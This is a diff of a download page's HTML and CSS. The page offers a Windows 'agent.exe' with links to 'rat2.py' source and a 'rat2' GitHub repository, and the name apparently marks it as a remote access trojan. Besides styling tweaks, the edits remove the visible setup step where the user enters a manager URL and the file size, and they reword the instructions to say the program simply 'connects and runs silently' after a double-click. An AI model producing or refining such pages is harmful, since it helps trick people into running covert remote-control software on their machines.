@@ -12,6 +12,7 @@
     --accent: #58a6ff;
     --text:   #e6edf3;
     --muted:  #8b949e;
+    --green:  #3fb950;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
@@ -29,7 +30,7 @@
     border: 1px solid var(--border);
     border-radius: 16px;
     padding: 48px;
-    max-width: 560px;
+    max-width: 520px;
     width: 100%;
     text-align: center;
   }
@@ -43,7 +44,7 @@
     color: #000;
     font-weight: 700;
     font-size: 17px;
-    padding: 15px 40px;
+    padding: 15px 44px;
     border-radius: 10px;
     text-decoration: none;
     transition: opacity .15s;
@@ -60,11 +61,10 @@
     margin-bottom: 28px;
   }
   .steps h3 { font-size: 11px; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: .08em; margin-bottom: 18px; }
-  .step { display: flex; gap: 14px; margin-bottom: 16px; align-items: flex-start; }
+  .step { display: flex; gap: 14px; margin-bottom: 14px; align-items: center; }
   .step:last-child { margin-bottom: 0; }
-  .step-num { background: var(--accent); color: #000; font-weight: 700; font-size: 11px; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 2px; }
-  .step-text { font-size: 14px; line-height: 1.5; }
-  code { background: var(--border); border-radius: 4px; padding: 2px 6px; font-family: 'Cascadia Code', Consolas, monospace; font-size: 13px; color: var(--accent); }
+  .step-num { background: var(--green); color: #000; font-weight: 700; font-size: 11px; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .step-text { font-size: 14px; }
   .divider { border: none; border-top: 1px solid var(--border); margin: 0 0 20px; }
   .alt-link { font-size: 13px; color: var(--muted); }
   .alt-link a { color: var(--muted); text-decoration: underline; }
@@ -79,28 +79,27 @@
   <a class="primary-btn" href="/agent.exe" download="agent.exe">
     &#8595;&nbsp; Download agent.exe
   </a>
-  <div class="sub-note">Windows &bull; 19 MB &bull; No installation required</div>
+  <div class="sub-note">Windows &bull; No installation &bull; No setup</div>
 
   <div class="steps">
     <h3>How to use</h3>
     <div class="step">
       <div class="step-num">1</div>
-      <div class="step-text">Download and double-click <code>agent.exe</code></div>
+      <div class="step-text">Download <strong>agent.exe</strong></div>
     </div>
     <div class="step">
       <div class="step-num">2</div>
-      <div class="step-text">A setup window appears once &mdash; enter your manager URL and an optional location label</div>
+      <div class="step-text">Double-click it</div>
     </div>
     <div class="step">
       <div class="step-num">3</div>
-      <div class="step-text">Click <strong>Connect</strong> &mdash; the agent runs silently in the background and never asks again</div>
+      <div class="step-text">Done &mdash; it connects and runs silently</div>
     </div>
   </div>
 
   <hr class="divider">
   <div class="alt-link">
-    Need the Python source?
-    <a href="/rat2.py" download="rat2.py">Download rat2.py</a>
+    <a href="/rat2.py" download="rat2.py">Python source</a>
     &nbsp;&bull;&nbsp;
     <a href="https://github.com/ITZV0LT/rat2" target="_blank" rel="noopener">GitHub</a>
   </div>
